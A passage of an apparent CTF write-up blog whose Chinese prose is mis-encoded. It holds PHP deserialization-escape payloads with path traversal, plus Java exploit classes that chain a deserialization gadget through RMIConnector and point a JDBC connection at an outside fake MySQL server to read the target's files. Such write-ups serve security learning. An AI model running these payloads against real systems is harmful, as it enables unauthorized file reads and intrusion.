class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/prankhub$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">                    @<span class="variable">$out</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>.<span class="variable">$out</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;&lt;br/&gt;error&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;try it!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>)))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸,wakeupåˆ©ç”¨<code>+1</code>ç»•è¿‡</p><p>åé¢orderç±»ç›´æ¥ç”¨</p><p>orderç±»çš„ç»•è¿‡ï¼Œç”¨cmd:&#x2F;&#x2F;ï¼Œä¼šæŠŠåé¢çš„ä¸œè¥¿å½“æˆæ–‡ä»¶å¤¹è§£æï¼Œå°±èƒ½ç»•è¿‡hostï¼Œå†ç›®å½•ç©¿è¶Šå°±è¡Œäº†</p><p> å…ˆè¯»hint.php </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=&quot;;s:8:&quot;password&quot;;O:5:&quot;order&quot;:3:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:55:&quot;cmd://prankhub/../../../../../../../../../../../../../var/www/html/hint.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>çŸ¥é“äº†flagæ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=&quot;;s:8:&quot;password&quot;;O:5:&quot;order&quot;:3:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:52:&quot;cmd://prankhub/../../../../../../../../../../../../../../f1111444449999.txt&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="NoRCE"><a href="#NoRCE" class="headerlink" title="NoRCE"></a>NoRCE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.JDBCååºåˆ—åŒ–</span><br><span class="line">2.äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡</span><br></pre></td></tr></table></figure><p>jdbcååºåˆ—åŒ–gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException =&gt; MyBean::toString =&gt; MyBean::getConnect</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨cc5é“¾å‰åŠéƒ¨åˆ†å¯æ„é€ åˆ°MyBean::toString</p><p>ä½†æ˜¯banäº†<code>java\\.rmi.*</code>å¯¼è‡´æ— æ³•è¿›è¡ŒJDBCè¿æ¥ï¼Œåˆ©ç”¨äºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡ï¼Œå‚è€ƒ<a href="http://tttang.com/archive/1701/#toc_rmiconnector">JavaäºŒæ¬¡ååºåˆ—åŒ–</a></p><p><code>java\\.security.*</code>è¢«banäº†ï¼Œè¿˜å¯ä»¥ç”¨<code>javax.management</code>ä¸‹çš„<code>RMIConnector</code></p><p>å› ä¸ºåœ¨<code>/read</code>è·¯ç”±å¤„æƒ³è¦è¿›å…¥ååºåˆ—åŒ–è¿˜éœ€è¦å…ˆè¿›è¡Œä¸€ä¸ªåˆ¤æ–­</p><p><a href="https://imgse.com/i/ppbKcRA"><img src="https://s1.ax1x.com/2023/04/09/ppbKcRA.png" alt="ppbKcRA.png"></a></p><p>ç”±äºååºåˆ—åŒ–å‰é¢å…­ä¸ªå­—ç¬¦å›ºå®šä¸º<code>rO0ABX</code>ï¼Œéšä¾¿æ„é€ ä¸€ä¸ªä¸<code>rO0ABX</code>çš„hashCodeç›¸åŒçš„å­—ç¬¦ä¸²å°±è¡Œäº†<code>rO0B#X</code></p><p>åˆ©ç”¨<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a>è¿›è¡Œæ–‡ä»¶è¯»å–</p><p>ç›´æ¥è¯»<code>/flag</code>ï¼Œå‘ç°è¯»ä¸åˆ°ï¼Œåœ¨MySQL Fake Serveré¡¹ç›®ä¸‹æœ‰è¿™æ ·ä¸€æ®µè¯ï¼šæœ‰å…³JDBCä¸‹çš„<code>allowUrlInLocalInfile</code>é€‰é¡¹å¯ä»¥çœ‹ä¸‹è¿™ç¯‡ï¼š<a href="https://blog.csdn.net/fnmsd/article/details/117436182">MySQL JDBC Connectorçš„allowUrlInLocalInfileé€‰é¡¹åˆ©ç”¨</a></p><p>å‘ç°å½“<code>allowUrlInLocalInfile</code>ä¸ºtrueçš„æ—¶å€™å¯ä»¥ç”¨<code>file://</code>åè®®</p><p>åˆ—ä¸‹æ ¹ç›®å½•</p><p><strong>exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.bean.Connect;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.bean.MyBean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Connect</span> <span class="variable">connect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Connect</span>(<span class="string">&quot;jdbc:mysql://81.70.221.206:3306/test?user=fileread_file:///&amp;allowUrlInLocalInfile=true&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,connect);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, myBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> exp1.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp2(äºŒæ¬¡ååºåˆ—åŒ–)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.bean.MyBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setField(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAEnQAFWNvbS5leGFtcGxlLmRlbW8uZXhwMXQACWV4cDEuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyABxjb20uZXhhbXBsZS5kZW1vLmJlYW4uTXlCZWFuARWqFxxWRSkCAANMAARjb25udAAmTGphdmF4L21hbmFnZW1lbnQvcmVtb3RlL0pNWENvbm5lY3RvcjtMAAdtZXNzYWdlcQB+AAFMAAN1cmxxAH4AAXhwc3IAHWNvbS5leGFtcGxlLmRlbW8uYmVhbi5Db25uZWN0R47cxjUrFq4CAANMAARuYW1lcQB+AAVMAAhwYXNzd29yZHEAfgAFTAADdXJscQB+AAV4cHQAAHEAfgAbdABWamRiYzpteXNxbDovLzgxLjcwLjIyMS4yMDY6MzMwNi90ZXN0P3VzZXI9ZmlsZXJlYWRfZmlsZTovLy8mYWxsb3dVcmxJbkxvY2FsSW5maWxlPXRydWVxAH4AG3EAfgAb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, rmiConnector);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, myBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;rO0B#X&quot;</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> exp2.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppbKRMt"><img src="https://s1.ax1x.com/2023/04/09/ppbKRMt.png" alt="ppbKRMt.png"></a></p><p>è¯»flag</p><p><strong>exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.bean.Connect;</span><br><span class="line"><span class="keyword">import</span> com.example.demo.bean.MyBean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Connect</span> <span class="variable">connect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Connect</span>(<span class="string">&quot;jdbc:mysql://81.70.221.206:3306/test?user=fileread_file:///flagyoucatfindit&amp;allowUrlInLocalInfile=true&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,connect);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, myBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> exp1.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.bean.MyBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setField(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAEnQAFWNvbS5leGFtcGxlLmRlbW8uZXhwMXQACWV4cDEuamF2YXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AB3hyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAVeHNyABxjb20uZXhhbXBsZS5kZW1vLmJlYW4uTXlCZWFuARWqFxxWRSkCAANMAARjb25udAAmTGphdmF4L21hbmFnZW1lbnQvcmVtb3RlL0pNWENvbm5lY3RvcjtMAAdtZXNzYWdlcQB+AAFMAAN1cmxxAH4AAXhwc3IAHWNvbS5leGFtcGxlLmRlbW8uYmVhbi5Db25uZWN0R47cxjUrFq4CAANMAARuYW1lcQB+AAVMAAhwYXNzd29yZHEAfgAFTAADdXJscQB+AAV4cHQAAHEAfgAbdABmamRiYzpteXNxbDovLzgxLjcwLjIyMS4yMDY6MzMwNi90ZXN0P3VzZXI9ZmlsZXJlYWRfZmlsZTovLy9mbGFneW91Y2F0ZmluZGl0JmFsbG93VXJsSW5Mb2NhbEluZmlsZT10cnVlcQB+ABtxAH4AGw==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, rmiConnector);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, myBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span 